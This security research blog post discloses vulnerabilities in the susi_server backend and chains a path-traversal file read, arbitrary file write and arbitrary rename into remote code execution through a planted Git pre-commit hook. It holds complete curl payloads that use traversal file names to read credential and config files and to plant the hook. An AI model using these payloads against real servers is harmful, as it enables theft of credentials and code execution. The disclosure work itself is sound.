---
layout: post
title: "From Arbitrary File Write to RCE Using Git Hooks in fossasia/susi_server"
---

# From Arbitrary File Write to RCE Using Git Hooks in fossasia/susi_server
## Introduction
Some time ago I thought that it would be a fun idea to create a {{ site.linkToCodeQlGithub}} query that detects arbitrary(=user-controlled) file reads and writes in Java applications.\
The query is sadly not yet production-ready but it already found some results.
In this post I'm going to show you different vulnerabilities that I found in [fossasia/susi_server](https://github.com/fossasia/susi_server).\
`susi_server` is the backend server for [SUSI.AI](https://susi.ai/):
> SUSI.AI is an intelligent Open Source personal assistant. It is capable of chat and voice interaction by using APIs to perform actions such as music playback, making to-do lists, setting alarms, streaming podcasts, playing audiobooks, and providing weather, traffic, and other real-time information.

Here's an outline of what I'm going to show:
1. Arbitrary file read
2. Arbitrary `.txt` file write
3. Arbitrary file rename
4. A combination of 2. and 3. for an arbitrary file write
5. RCE in `susi_server` using Git hooks

(`susi_server` contains multiple arbitrary file reads, writes, renames, and directory listings and I can't cover all vulnerabilities. This [lgtm.com query](https://lgtm.com/query/7296233609860422014/) shows all instances where user-controlled values are used in paths.)

<video preload="none" controls="controls" width="100%">
{% for video in site.static_files %}
  {% if video.path contains 'assets/videos/isl-2020-001-fossasia_susi_server_git_hooks_rce.mp4' %}
      <source type="video/mp4" src="{{ video.path }}"></source>
  {% endif %}
  {% if video.path contains 'assets/videos/isl-2020-001-fossasia_susi_server_git_hooks_rce.webm' %}
      <source type="video/webm" src="{{ video.path }}"></source>
  {% endif %}
{% endfor %}
  <p>Your browser does not support the video element.</p>
</video>


[LINK TO GIF OF POPPING UP CALC TO-BE-DONE]

# Setup Instructions
## Requirements
- Java 11
- Linux (Mac might also work)

## General Setup
```bash
git clone https://github.com/fossasia/susi_server
cd susi_server
git checkout d27ed0f5dc6ec4a097f02e6db3794b3896205bc5
./gradlew build -x test
mkdir data/image_uploads/
bin/start.sh
# Should now be running here: http://localhost:4000
```
## Editing the Configuration
We have to do one small edit in `conf/config.properties` to match the configuration of SUSI.AI, which is the official deployed version of `susi_server`.
Namely, we have to change `skill_repo.pull_enable = false` to `skill_repo.pull_enable = true`.
## Creating an Account
It's rather complicated to (locally) create an account for `susi_server` and not easily possible without messing with the source code.
I've messed with the source and created the account `local@local.de` with the wonderful password `123asdA!`
But it's far easier to just execute these two commands which will recreate the above account:
```bash
echo '{"passwd_login:local@local.de": {
  "salt": "DLLACzvJzjzsKbv5KX0h",
  "id": "email:local@local.de",
  "passwordHash": "7RSabEzhkMpOfpVsiQrEK3kzDCABkzYZ9P2rwqwy9cw=",
  "activated": true
}}' > data/settings/authentication.json
echo '{"email:local@local.de": {
  "permissions": {},
  "userRole": "user"
}}' > data/settings/authorization.json
```

## Getting an Access Token
For some of the exploits we have to be authenticated.
The official instance of `susi_server` allows anyone to register, so practically authentication is no barrier.
Executing `curl 'http://localhost:4000/aaa/login.json?login=local@local.de&type=access-token&password=123asdA!'` will give us an access token.

# Arbitrary File Read
This issue allows any _unauthenticated_ person to read arbitrary files.
Let's say we have "forgotten" the password of the account we just created.

How can we get it back?
Easy, `curl http://localhost:4000/cms/getImage.png?image=../settings/authentication.json` will give us:
```json
{"passwd_login:local@local.de": {
  "salt": "DLLACzvJzjzsKbv5KX0h",
  "id": "email:local@local.de",
  "passwordHash": "7RSabEzhkMpOfpVsiQrEK3kzDCABkzYZ9P2rwqwy9cw=",
  "activated": true
}}
```
and `curl http://localhost:4000/cms/getImage.png?image=../settings/authorization.json` will tell us, whether this is an _admin_ or a normal _user_ account:
```json
{"email:local@local.de": {
  "permissions": {},
  "userRole": "user"
}}
```
One could then use `hashcat` to break the hash.

Running `curl http://localhost:4000/cms/getImage.png?image=../../conf/config.properties` would get us AWS keys or in certain cases the password for a Github acccount.

**Any file that the application can read, can also be read by us!**
## Cause
`GetImageServlet.java` directly derives `image_path` from the `GET` parameter `image` and then uses it to create a new `File` whose content will then be transmitted back to us.
```java
String image_path = post.get("image","");
[...]
imageFile = new File(DAO.data_dir  + File.separator + "image_uploads" + File.separator + image_path);
```



# Arbitrary (.txt) File Write
Running `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'model=general' -F 'group=Knowledge' -F 'language=en' -F 'skill=whois' -F 'content=OWNED'  -F 'image=' -F 'image_name=owned' 'http://localhost:4000/cms/createSkill.json'`
will successfully create the file `susi_skill_data/models/general/Knowledge/en/whois.txt` (`susi_skill_data` is a sibling directory of `susi_server`) with the content `OWNED`.

## Cause
`CreateSkillService.java` directly derives `skill_name` from the `GET` parameter `skill`. This is then used to retrieve a `skill` file to which user-controlled `content` is written.
```java
String skill_name = req.getParameter("skill");
File skill = DAO.getSkillFileInLanguage(language, skill_name, false);
[...]
String content = req.getParameter("content");
[...]
try (FileWriter Skillfile = new FileWriter(skill)) {
Skillfile.write(content);

```


# Arbitrary File Write via Arbitrary Rename
Running `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=hacked' -F 'content=ANYTHING' -F 'new_image_name=PATH_TO_SOME_FILE' -F 'old_image_name=PATH_TO_SOME_FILE' 'http://localhost:4000/cms/modifySkill.json'` will rename the skill from `whois` (`-F 'OldSkill=whois'`) to `hacked` (`-F 'NewSkill=hacked'`).
But more importantly using `old_image_name` and `new_image_name` allows us to rename an arbitrary file!
So for an arbitrary write we just have to use the arbitrary `.txt` write and then rename the `.txt` file to whatever we want!

## Cause
`ModifySkillService.java` directly derives `new_image_name` and `old_image_name` from a `GET` parameter.
The resulting (user-controlled) paths are then used in `old_path.toFile().renameTo(new_path.toFile())` which makes this an arbitrary rename.
```java
String new_image_name = call.getParameter("new_image_name"); // Line 273
Path new_path = Paths.get(modified_language + File.separator + "images/" + new_image_name); // 275
[...]
String old_image_name = call.getParameter("old_image_name"); // 328
Path old_path = Paths.get(language + File.separator + "images/" + old_image_name);
if (!Files.exists(new_path)) {
    old_path.toFile().renameTo(new_path.toFile());
```

http://localhost:4000/cms/getImage.png?image=../settings/authentication.json

# Remote Code Execution (Using Git Hooks)
(If you know an easier way, let me know!)\
So how can we get RCE via arbitrary write?
I did not know any easier way, so I chose this way:\
`susi_server` has a Git repository for its skill data, so that all modifications to the skills are commited to Git.\
It uses JGit to periodically (every 60 seconds) perform the commits, so my idea was to (ab)use Git pre commit hooks to execute arbitrary code!\
Plan of action:
1. Write a `.txt` file with the content `#!/bin/sh\nexec xcalc`.
2. Rename the `.txt` so that it ends up as `susi_skill_data/.git/hooks/pre-commit`.
3. **The rename causes a commit and our pre-commit hook gets triggered.**

After running the necessary `curl` commands and after the commit has happened a calculator should have popped up.
But it didn't.
Why?\
Both Git and JGit require the `pre-commit` to be executable and our file isn't.

Luckily, Git by default includes sample hooks that are executable!\
So the new plan of action looks like this:
1. Rename `susi_skill_data/.git/hooks/pre-commit.sample` to a `.txt` file that we can write to.
2. Write `#!/bin/sh\nexec xcalc` to the `.txt` file.
3. Rename the `.txt` file to `susi_skill_data/.git/hooks/pre-commit`.
4. The rename causes a commit and the `pre-commit.sample` by default has executable permissions!

We do this by running two commands:
1. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' -F 'old_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit.sample' 'http://localhost:4000/cms/modifySkill.json'`\
This will replace the content of `whois.txt` (which we created earlier in the arbitrary `.txt` file write section) with `ANYTHING` and **move `pre-commit.sample` (from the hooks directory) to `pre-commit.txt` which is in the same directory as `whois.txt`.**
2. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' -F $'content=#!/bin/sh\nexec xcalc' -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'`\
This will replace the content of `pre-commit.txt` with\
`#!/bin/sh`\
`exec xcalc`\
and move `pre-commit.txt` (from the skills directory) to `pre-commit` (in the hooks directory).

Still, no calculator :(
Why?\
**Only** Git includes sample hooks while JGit doesn't.

So we need another source for an executable file which we quickly find in `susi_server/src/org/json/JSONException.java`. Here we are assuming that the source code of `susi_server` is available. If it isn't (because we're running a prebuilt version) we will have to find another executable file.

We change the first curl command:
1. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' -F 'old_image_name=../../../../../../`**`susi_server/src/org/json/JSONException.java`**`' 'http://localhost:4000/cms/modifySkill.json'`
2. Run `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' -F $'content=#!/bin/sh\nexec xcalc' -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'`

Et voila!
After about 60 seconds a calc pops up.